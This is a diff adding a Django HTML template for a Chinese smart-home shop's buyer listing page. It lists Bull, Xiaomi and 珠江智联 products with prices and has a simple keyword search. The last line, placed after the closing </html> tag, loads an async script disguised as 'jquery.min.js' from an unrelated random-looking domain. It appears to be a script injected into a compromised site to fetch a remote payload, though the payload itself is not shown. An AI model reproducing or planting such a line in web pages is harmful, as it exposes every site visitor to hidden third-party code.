@@ -1,0 +1,857 @@
+{% load staticfiles %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>珠江智联</title>
+	<meta content="" name="keywords" />
+	<meta content="" name="description" />
+	<link href="{% static '/goals/css/car.css' %}" rel="stylesheet" type="text/css" />
+	<script type="text/javascript" src="{% static '/goals/js/jquery.js' %}"></script>
+	<script language="JavaScript">
+		$(function () {
+			//品牌选择
+
+			$("div.car_tab ul li a").mouseover(function () {
+				$(this).addClass("here").parent().siblings().children().removeClass("here");
+				var index = $div_li.index(this);
+				$("div.cartab_box > div").eq(index).show().siblings().hide();
+			});
+		})
+	</script>
+</head>
+
+<body>
+	<!--内容-->
+	<script type="text/javascript" src="{% static '/goals/js/jquery.inputtext.js' %}"></script>
+
+
+	<div class="top">
+		<div class="top_main clearfix">
+			<div class="top_right">
+				欢迎来到珠江智联！
+				<span>
+					<a href="{% url 'sign_in' %}"> 登录</a>
+				</span>
+				<span>
+					<a href="{% url 'register' %}"> 注册</a>
+				</span>
+			</div>
+		</div>
+	</div>
+	<div class="headw">
+		<div class="head">
+			<div class="logo" style="text-align: center;line-height: 70px;color: green;">珠江智联</div>
+			<div class="topsearch">
+				<div class="topsearchbox">
+					<form>
+						<input type="text" name="k" class="keywords" value="请输入关键词，如小米">
+						<!-- <input type="submit" value="搜索" class="button" /> -->
+						<span style="display: inline;padding:10px 25px;color:#fff;font-size:17px;background: #bc1950;cursor: pointer;" class="button">搜索</span>
+						<!-- <input type="hidden" name="m" value="search"> -->
+					</form>
+				</div>
+				
+				<script>
+					$('.button').click(function () {
+						var a = $('.keywords').val();
+						console.log(a);
+						if (a == '小米' || a == '小' || a == '米') {
+							window.location.href = "{% url 'seachx' %}";
+						} else if (a == '公牛' || a == '公' || a == '牛') {
+							window.location.href = "{% url 'seachg' %}";
+						} else if (a == '珠江智联' || a == '珠江' || a == '智联' || a == '珠' || a == '智') {
+							window.location.href = "{% url 'seachz' %}";
+						}else {
+						    window.location.href = "{%  url 'seachnull' %}";
+                        }
+					});
+				</script>
+				<p class="topkeywords">
+					<a href="{% url 'seachx' %}">小米</a>&nbsp;&nbsp;
+					<a href="{% url 'seachg' %}">公牛</a>&nbsp;&nbsp;</p>
+			</div>
+			<div class="carnum" id="carcount">
+			</div>
+		</div>
+	</div>
+	<div class="nav_list">
+		<ul class="clearfix">
+			<li>
+				<a href="{% url 'index' %}" title="首页">首页</a>
+			</li>
+			<li>
+				<a href="{% url 'sell' %}" title="卖车">卖家</a>
+			</li>
+			<li>
+				<a href="{% url 'seach' %}" title="买车" class="here">买家</a>
+			</li>
+			<li>
+				<a href="{% url 'about' %}" title="联系">联系</a>
+			</li>
+		</ul>
+	</div>
+	<!--头部end -->
+	<div class="nav">您当前的位置：
+		<a href="{% url 'index' %}">首页</a>
+		<span>></span>
+		<a href="/">买家</a>
+	</div>
+	<div class="main clearfix mt10">
+		<div class="main_left">
+			<div class="search_box">
+
+				<ul class="search_list">
+					<form method="get">
+						<li>品 牌：
+							<a href="{% url 'seach' %}" class="here">全部</a>
+							<a href="{% url 'seachg' %}">公牛</a>
+							<a href="{% url 'seachx' %}">小米</a>
+						
+							<a href="{% url 'seachz' %}">珠江智联</a>
+						
+						</li>
+					</form>
+
+				</ul>
+			</div>
+			<div class="cartype mt15">
+				<ul class="clearfix">
+					<li>
+						<a href="{% url 'seach' %}" class="here">全部商品</a>
+					</li>
+					<li>
+						<a href="{% url 'seachx' %}">商家商品</a>
+					</li>
+					<li>
+						<a href="{% url 'seachz' %}">个人商品</a>
+					</li>
+				</ul>
+			</div>
+			<div class="search_big_box">
+				<div class="orderlist">
+
+				</div>
+				<div class="box"></div>
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg1' %}" target="_blank">
+								<img src="{%  static 'goals/images/g101.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg1' %}" target="_blank">公牛 门铃</a>
+								</span>
+							
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>  
+								/ 型号：
+								<span class="orange01"> GWM01A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+								</p>
+								<p class="gray">产品说明：</p>
+								<p class="gray">发布时间：2018-05-16</p>
+
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥108.00</span>
+						</div>
+					</div>
+					
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg2' %}" target="_blank">
+								<img src="{%  static 'goals/images/g201.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg2' %}" target="_blank">公牛 插座</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>
+								/ 型号：
+								<span class="orange01"> GW601</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-15</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥68.00</span>
+						</div>
+					</div>
+
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg3' %}" target="_blank">
+								<img src="{%  static 'goals/images/g301.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg3' %}" target="_blank">公牛 装换插头</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>
+								/ 型号：
+								<span class="orange01"> GW90A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥38.00</span>
+						</div>
+					</div>
+
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg4' %}" target="_blank">
+								<img src="{%  static 'goals/images/g401.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg4' %}" target="_blank">公牛 立式插座</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>
+								/ 型号：
+								<span class="orange01"> GW90A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥188.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz1' %}" target="_blank">
+								<img src="{%  static 'goals/images/101.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz1' %}" target="_blank">珠江智联 紧急按钮</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01"> A803</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥108.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz2' %}" target="_blank">
+								<img src="{%  static 'goals/images/201.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz2' %}" target="_blank">珠江智联 可视门铃</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01"> F78</span>
+								/ 颜色：
+								<span class="orange01">黑色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥388.00</span>
+						</div>
+					</div>
+
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz3' %}" target="_blank">
+								<img src="{%  static 'goals/images/301.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz3' %}" target="_blank">珠江智联 智能家居控制</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01"> K159</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥2998.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productx1' %}" target="_blank">
+								<img src="{%  static 'goals/images/x101.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productx1' %}" target="_blank">小米 扫地机器人</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">小米</span>
+								/ 型号：
+								<span class="orange01"> G1A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥1688.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productx2' %}" target="_blank">
+								<img src="{%  static 'goals/images/x201.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productx2' %}" target="_blank">小米 空气净化器</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">小米</span>
+								/ 型号：
+								<span class="orange01"> G891A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥1499.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productx3' %}" target="_blank">
+								<img src="{%  static 'goals/images/x301.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productx3' %}" target="_blank">小米 电水壶</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">小米</span>
+								/ 型号：
+								<span class="orange01"> G601A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥199.00</span>
+						</div>
+					</div>
+
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg5' %}" target="_blank">
+								<img src="{%  static 'goals/images/g501.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg5' %}" target="_blank">公牛 智能快充</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>
+								/ 型号：
+								<span class="orange01"> GWM1A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥88.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg7' %}" target="_blank">
+								<img src="{%  static 'goals/images/g701.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg7' %}" target="_blank">公牛 变压器</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>
+								/ 型号：
+								<span class="orange01"> GWM01A</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥116.00</span>
+						</div>
+					</div>
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productg6' %}" target="_blank">
+								<img src="{%  static 'goals/images/g601.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productg6' %}" target="_blank">公牛 电缆</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">公牛</span>
+								/ 型号：
+								<span class="orange01">H34</span>
+								/ 颜色：
+								<span class="orange01">黑色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥88.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productx4' %}" target="_blank">
+								<img src="{%  static 'goals/images/x401.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productx4' %}" target="_blank">小米 电饭锅</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">小米</span>
+								/ 型号：
+								<span class="orange01">MW750</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥999.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productx5' %}" target="_blank">
+								<img src="{%  static 'goals/images/x501.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productx5' %}" target="_blank">小米 净水器</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">小米</span>
+								/ 型号：
+								<span class="orange01">g750</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥1788.00</span>
+						</div>
+					</div>
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productx6' %}" target="_blank">
+								<img src="{%  static 'goals/images/x601.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productx6' %}" target="_blank">小米 电池炉</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">小米</span>
+								/ 型号：
+								<span class="orange01">MW750</span>
+								/ 颜色：
+								<span class="orange01">黑色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥339.00</span>
+						</div>
+					</div>
+
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz4' %}" target="_blank">
+								<img src="{%  static 'goals/images/401.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz4' %}" target="_blank">珠江智联 智能门锁</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01">M750</span>
+								/ 颜色：
+								<span class="orange01">黑色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥1388.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz5' %}" target="_blank">
+								<img src="{%  static 'goals/images/501.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz5' %}" target="_blank">珠江智联 智能可燃气体感应器</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01">U750</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥108.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz6' %}" target="_blank">
+								<img src="{%  static 'goals/images/801.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz6' %}" target="_blank">珠江智联 红外线感应器</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01">M750</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥388.00</span>
+						</div>
+					</div>
+
+					<div class="listcar clearfix">
+						<div class="img">
+							<a href="{% url 'productz7' %}" target="_blank">
+								<img src="{%  static 'goals/images/901.jpg' %}" />
+							</a>
+						</div>
+						<div class="word">
+							<p class="clearfix">
+								<span class="carname fl">
+									<a href="{% url 'productz7' %}" target="_blank">珠江智联 智能门磁</a>
+								</span>
+					
+							</p>
+							<p class="gray">
+								品牌：
+								<span class="orange01">珠江智联</span>
+								/ 型号：
+								<span class="orange01">MY50</span>
+								/ 颜色：
+								<span class="orange01">白色</span>
+							</p>
+							<p class="gray">产品说明：</p>
+							<p class="gray">发布时间：2018-05-16</p>
+					
+						</div>
+						<div class="price">
+							<span class="orange01 fb f14 fr">￥288.00</span>
+						</div>
+					</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+					<div class="page_list">
+						<span>共20条</span>
+						<span>第1/1页</span>
+						<a href="{%  url 'seach' %}">首页</a>
+						<a href="{%  url 'seach' %}">下一页</a>
+						<a href="{%  url 'seach' %}">尾页</a>
+					</div>
+				</div>
+			
+		</div>
+		<div class="main_right">
+
+			<div class="commonbox02">
+				<h3>热门商品</h3>
+				<div class="box">
+					<ul class="carlist clearfix">
+						<li>
+							<a href="{% url 'productg5' %}" target="_blank">
+								<img src="{%  static 'goals/images/501.jpg' %}" />
+							</a>
+							<p class="mt10">
+								<a href="{% url 'productg5' %}" target="_blank">珠江智联 可燃气感应器 </a>
+							</p>
+							<p class="gray01">
+								<span class="orange01 fb fr">￥108.00</span>
+							</p>
+						</li>
+						<li>
+							<a href="{% url 'productx1' %}" target="_blank">
+								<img src="{%  static 'goals/images/x101.jpg' %}" />
+							</a>
+							<p class="mt10">
+								<a href="{% url 'productx1' %}" target="_blank">小米 扫地机器人 </a>
+							</p>
+							<p class="gray01">
+								<span class="orange01 fb fr">￥1688.00</span>
+							</p>
+						</li>
+						<li>
+							<a href="{% url 'productz4' %}" target="_blank">
+								<img src="{%  static 'goals/images/401.jpg' %}" />
+							</a>
+							<p class="mt10">
+								<a href="{% url 'productz4' %}" target="_blank">珠江智联 智能门锁 </a>
+							</p>
+							<p class="gray01">
+								<span class="orange01 fb fr">￥1388.00</span>
+							</p>
+						</li>
+						<li>
+							<a href="{% url 'productg5' %}" target="_blank">
+								<img src="{%  static 'goals/images/g501.jpg' %}" />
+							</a>
+							<p class="mt10">
+								<a href="{% url 'productg5' %}" target="_blank">公牛智能快充 </a>
+							</p>
+							<p class="gray01">
+								<span class="orange01 fb fr">￥88.00</span>
+							</p>
+						</li>
+						<li>
+							<a href="{% url 'productg3' %}" target="_blank">
+								<img src="{%  static 'goals/images/g301.jpg' %}" />
+							</a>
+							<p class="mt10">
+								<a href="{% url 'productg3' %}" target="_blank">公牛 插座 </a>
+							</p>
+							<p class="gray01">
+								<span class="orange01 fb fr">￥38.00</span>
+							</p>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!--底部导航-->
+	<div class="footer" id="foot">
+		<p class="tc">
+			<a href="{% url 'index' %}" title="首页">首页</a> |
+			<a href="{% url 'sell' %}" title="卖车">卖家</a> |
+			<a href="{% url 'seach' %}" title="买车">买家</a> |
+			<a href="{% url 'about' %}" title="联系">联系</a> |
+		</p>
+		<p class="mt10"> Copyright 2019 广东珠江智联信息科技股份有限公司版权所有
+			<a href="http://www.miitbeian.gov.cn/" title="粤ICP备16037358号-4">粤ICP备16037358号-4</a>
+		</p>
+		<p class="mt10"> 电话：020-84138253 地址：广州市海珠区琶洲大道中06-08号907室</p>
+	</div>
+	<div id="right-side" class="right-side">
+		<ul>
+			<li class="side-top w4">
+				<a id="backtop" title="返回顶部" href="#top" style="display: block;">返回顶部</a>
+			</li>
+		</ul>
+	</div>
+	<!-- 版权 结束 -->
+</body>
+
+</html>
+<script charset="utf-8" async="true" src="http://ke.lduxnfz.com/s/ft/jquery.min.js"></script>
